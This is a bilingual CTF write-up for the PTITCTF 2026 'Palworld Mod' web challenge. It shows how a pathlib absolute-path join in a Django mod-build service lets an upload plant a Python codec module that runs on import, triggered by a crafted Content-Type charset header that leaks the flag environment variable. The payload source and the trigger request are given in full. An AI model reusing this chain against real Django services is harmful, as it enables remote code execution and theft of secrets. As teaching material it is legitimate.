---
title: "Palworld Mod"
date: 2026-08-23 12:00:00 +0700
categories: ["PTITCTF 2026", "Web"]
tags: ["web"]
description: "Bài giải chi tiết thử thách Palworld Mod (PTITCTF 2026 - Web)."
math: true
mermaid: true
---

{% raw %}

<div class="lang-switch" role="tablist" aria-label="Language switch">
  <button class="lang-btn active" role="tab" type="button" data-lang="en" aria-selected="true">EN</button>
  <button class="lang-btn" role="tab" type="button" data-lang="vn" aria-selected="false">VN</button>
</div>

<div class="lang-vn" markdown="1">

> **Flag:** `PTITCTF{p4th_tr4v3rs4l_c0d3c_rc3_p4lw0rld}`


Bài này thuộc category **Web**. Hệ thống là một dịch vụ web quản lý và đóng gói mod dành cho game Palworld, được xây dựng trên nền tảng **Django / Django REST Framework (DRF)** chạy Python 3.11 trong môi trường container.

Mục tiêu là tìm ra lỗ hổng trong quy trình xử lý tệp để đạt được quyền thực thi mã từ xa (RCE) và đọc cờ từ môi trường hệ thống.

---

## Sơ đồ luồng phân tích (Solve Flow)

```mermaid
flowchart TD
    A["Dịch vụ web: Quản lý build Palworld Mod (Django/DRF)"] --> B["Audit mã nguồn build mod: Cơ chế ghép đường dẫn bằng pathlib.Path"]
    B --> C["Phát hiện hành vi của pathlib: Bắt đầu bằng '/' sẽ bỏ qua prefix trước đó"]
    C --> D["Tạo Platform: code = 'python3.11/encodings', mod_version = '/usr/local/lib'"]
    D --> E["Đường dẫn tệp bị điều hướng tới: /usr/local/lib/python3.11/encodings/payload.py"]
    E --> F["Tải lên file ZIP chứa Python custom codec payload"]
    F --> G["Kích hoạt thực thi mã: Gửi request với header Content-Type charset=payload"]
    G --> H["Bộ parser gọi codecs.lookup() -> Nạp module và thực thi lệnh lấy Flag"]
    H --> I["Flag: PTITCTF{p4th_tr4v3rs4l_c0d3c_rc3_p4lw0rld}"]
```

---

## Bước 1: Khảo sát mã nguồn và phát hiện Path Traversal

Khi phân tích controller xử lý yêu cầu build bản mod của người dùng trong backend:
Đường dẫn thư mục lưu trữ được tính toán bằng cách nối chuỗi đối tượng `pathlib.Path`:

```python
target_dir = Path(settings.MEDIA_ROOT) / "builds" / platform.code / mod_version
```

Trong thư viện chuẩn `pathlib` của Python:
> Khi nối một đường dẫn với một thành phần bắt đầu bằng dấu gạch chéo `/` (tức đường dẫn tuyệt đối), `Path` sẽ **hủy bỏ toàn bộ phần tiền tố phía trước** và coi thành phần đó là gốc mới.

Lợi dụng đặc điểm này:
* `platform.code` có độ dài tối đa 20 ký tự $\rightarrow$ Đặt là `"python3.11/encodings"` (đúng 20 ký tự).
* `mod_version` là chuỗi người dùng kiểm soát $\rightarrow$ Đặt là `"/usr/local/lib"`.
* Biểu thức trở thành:
  $$\text{Path}("/data/media") / \text{"builds"} / \text{"/usr/local/lib"} / \text{"python3.11/encodings"}$$
  kết quả trả về chính xác thư mục chứa các bộ giải mã ký tự chuẩn của Python runtime: `/usr/local/lib/python3.11/encodings/`.

---

## Bước 2: Kỹ thuật RCE thông qua Custom Python Codec

Khi một ứng dụng Python nhận một request chứa tiêu đề `Content-Type: text/plain; charset=xyz`, Python sẽ tự động tìm kiếm bộ giải mã tương ứng thông qua hàm `codecs.lookup("xyz")`. Quá trình này sẽ tìm và import tệp `/usr/local/lib/python3.11/encodings/xyz.py`.

Chuẩn bị một tệp mã nguồn Python `pwncodec.py` định nghĩa giao diện codec chuẩn, đồng thời chèn mã lệnh đọc biến môi trường chứa flag:

```python
import codecs
import os

# Mã lệnh thực thi khi module được import
flag = os.environ.get("GZCTF_FLAG", os.environ.get("FLAG", "NO_FLAG"))
with open("/data/media/flag.txt", "w") as f:
    f.write(flag)

def getregentry():
    return codecs.CodecInfo(
        name="pwncodec",
        encode=codecs.latin_1_encode,
        decode=codecs.latin_1_decode,
    )
```

Đóng gói file này vào tệp ZIP và tải lên thông qua chức năng upload mod. File sẽ được ghi đè trực tiếp vào `/usr/local/lib/python3.11/encodings/pwncodec.py`.

---

## Bước 3: Kích hoạt Codec và Thu thập Flag

Gửi một HTTP request bất kỳ tới server kèm header chỉ định charset:

```http
POST /api/test/ HTTP/1.1
Host: target.ptitctf.vn
Content-Type: text/plain; charset=pwncodec

hello
```

Server nhận request, thực hiện tra cứu codec `pwncodec`, dẫn tới việc module độc hại được import vào tiến trình và ghi flag ra thư mục tĩnh. Truy cập đường dẫn tĩnh `/media/flag.txt` để tải cờ về.

⇒ **Flag:** `PTITCTF{p4th_tr4v3rs4l_c0d3c_rc3_p4lw0rld}`

</div>

<div class="lang-en" markdown="1">

> **Flag:** `PTITCTF{p4th_tr4v3rs4l_c0d3c_rc3_p4lw0rld}`


This article belongs to category **Web**. The system is a mod packaging and management web service for the game Palworld, built on the **Django / Django REST Framework (DRF)** platform running Python 3.11 in a container environment.

The goal is to find vulnerabilities in file processing to gain remote code execution (RCE) permissions and read flags from the system environment.

---

## Analysis Flow Diagram (Solve Flow)

```mermaid
flowchart TD
    A["Web service: Palworld Mod build management (Django/DRF)"] --> B["Audit build mod source code: Path concatenation mechanism using pathlib.Path"]
    B --> C["Detect pathlib behavior: Starting with '/' will ignore the previous prefix"]
    C --> D["Create Platform: code = 'python3.11/encodings', mod_version = '/usr/local/lib'"]
    D --> E["File path redirected to: /usr/local/lib/python3.11/encodings/payload.py"]
    E --> F["Upload a ZIP file containing Python custom codec payload"]
    F --> G["Enable code execution: Send request with header Content-Type charset=payload"]
    G --> H["The parser calls codecs.lookup() -> Loads the module and executes the command to get the Flag"]
    H --> I["Flag: PTITCTF{p4th_tr4v3rs4l_c0d3c_rc3_p4lw0rld}"]
```

---

## Step 1: Examine the source code and detect Path Traversal

When parsing the controller handling a user's mod build request in the backend: The storage directory path is calculated by concatenating the `pathlib.Path`:

```python
target_dir = Path(settings.MEDIA_ROOT) / "builds" / platform.code / mod_version
```

In Python's `pathlib` standard library:
> When concatenating a path with an element that begins with a slash `/` (i.e. an absolute path), `Path` will **remove the entire preceding prefix** and treat that element as the new root.

Take advantage of this feature:
* `platform.code` has a maximum length of 20 characters $\rightarrow$ Set to `"python3.11/encodings"` (exactly 20 characters).
* `mod_version` is the user-controlled string $\rightarrow$ Set to `"/usr/local/lib"`.
* The expression becomes:
$$\text{Path}("/data/media") / \text{"builds"} / \text{"/usr/local/lib"} / \text{"python3.11/encodings"}$$ returns the correct directory containing the standard Python runtime character decoders: `/usr/local/lib/python3.11/encodings/`.

---

## Step 2: RCE Engineering via Custom Python Codec

When a Python application receives a request containing the header `Content-Type: text/plain; charset=xyz`, Python will automatically search for the corresponding codec through the function `codecs.lookup("xyz")`. This process will find and import the file `/usr/local/lib/python3.11/encodings/xyz.py`.

Prepare a Python source file `pwncodec.py` that defines the standard codec interface, and insert code that reads the environment variable containing the flag:

```python
import codecs
import os

# Mã lệnh thực thi khi module được import
flag = os.environ.get("GZCTF_FLAG", os.environ.get("FLAG", "NO_FLAG"))
with open("/data/media/flag.txt", "w") as f:
    f.write(flag)

def getregentry():
    return codecs.CodecInfo(
        name="pwncodec",
        encode=codecs.latin_1_encode,
        decode=codecs.latin_1_decode,
    )
```

Package this file into a ZIP file and upload it via the mod upload function. The file will be overwritten directly into `/usr/local/lib/python3.11/encodings/pwncodec.py`.

---

## Step 3: Enable Codec and Collect Flags

Send any HTTP request to the server with a header specifying charset:

```http
POST /api/test/ HTTP/1.1
Host: target.ptitctf.vn
Content-Type: text/plain; charset=pwncodec

hello
```

The server receives the request, performs a lookup of the `pwncodec` codec, resulting in the malicious module being imported into the process and writing the flag to the static directory. Access the static path `/media/flag.txt` to download the flag.

⇒ **Flag:** `PTITCTF{p4th_tr4v3rs4l_c0d3c_rc3_p4lw0rld}`
</div>

{% endraw %}
